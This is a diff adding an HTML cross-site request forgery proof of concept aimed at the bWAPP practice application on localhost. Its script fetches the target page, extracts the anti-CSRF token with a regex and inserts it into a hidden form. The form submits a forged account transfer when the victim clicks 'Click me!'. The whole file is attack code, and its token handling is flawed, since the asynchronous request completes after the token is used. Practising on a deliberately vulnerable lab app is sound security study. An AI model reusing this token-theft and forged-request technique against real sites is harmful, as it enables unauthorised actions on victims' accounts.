@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+	<h1>CSRF POC</h1></br>
+	<script>
+		var token = null;
+		function getcsrf()
+		{
+			var xmlHttp = new XMLHttpRequest();
+			xmlHttp.onreadystatechange = function(){
+				token = this.responseText;
+				let regexp = /value\=\"([A-Za-z0-9]{3,})\"/ig;
+				ans = regexp.exec(token);
+				token = ans[1];
+			}
+			xmlHttp.open("GET","http://localhost/bWAPP/csrf_2.php",true);
+			xmlHttp.send();
+		}
+		window.onload = function(){
+			getcsrf();
+			alert(token);
+			document.getElementById("key").value = token;
+		}
+	</script>
+	<form action="http://localhost/bWAPP/csrf_2.php" method="GET">
+		<input type="hidden" name="account" value="123-45678-90">
+		<input type="hidden" name="amount" value="12">
+		<input type="hidden" name="action" value="transfer">
+		<input type="hidden" id="key" name="token" value=token>
+		<input type="submit" value="Click me!">
+	</form>
+</html>
